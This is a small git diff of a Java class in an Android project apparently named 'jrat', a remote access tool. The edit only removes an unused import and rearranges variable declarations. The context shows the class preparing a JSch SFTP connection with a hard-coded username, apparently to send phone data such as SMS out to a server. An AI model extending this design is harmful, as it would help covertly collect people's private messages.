@@ -3,7 +3,6 @@ package com.julioxus.jrat;
 import android.content.Context;
 import android.os.AsyncTask;
 import android.os.Environment;
-import android.util.Pair;
 
 import com.jcraft.jsch.Channel;
 import com.jcraft.jsch.ChannelSftp;
@@ -38,9 +37,9 @@ public class SendSMSAsyncTask extends AsyncTask<Context, Void, String> {
     protected String doInBackground(Context...params) {
 
         // Connection variables
-        JSch jsch = null;
+        JSch jsch;
+        Channel channel;
         Session session = null;
-        Channel channel = null;
         ChannelSftp c = null;
 
         String username = "jrat";
